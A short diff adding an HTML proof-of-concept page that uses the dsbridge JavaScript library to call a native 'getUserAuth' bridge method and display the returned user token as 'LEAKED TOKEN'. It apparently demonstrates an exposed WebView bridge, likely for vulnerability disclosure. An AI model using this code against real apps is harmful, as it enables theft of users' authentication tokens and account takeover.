@@ -1,0 +1,11 @@
+<!doctype html>
+  <meta charset="utf-8">
+  <title>poc</title>
+  <script src="https://cdn.jsdelivr.net/npm/dsbridge@3.1.4/dist/dsbridge.js"></script>
+  <pre id="out">calling getUserAuth…</pre>
+  <script>
+    dsBridge.call("getUserAuth", function (res) {
+      document.getElementById("out").textContent =
+        "LEAKED TOKEN:\n" + JSON.stringify(res, null, 2);
+    });
+  </script>
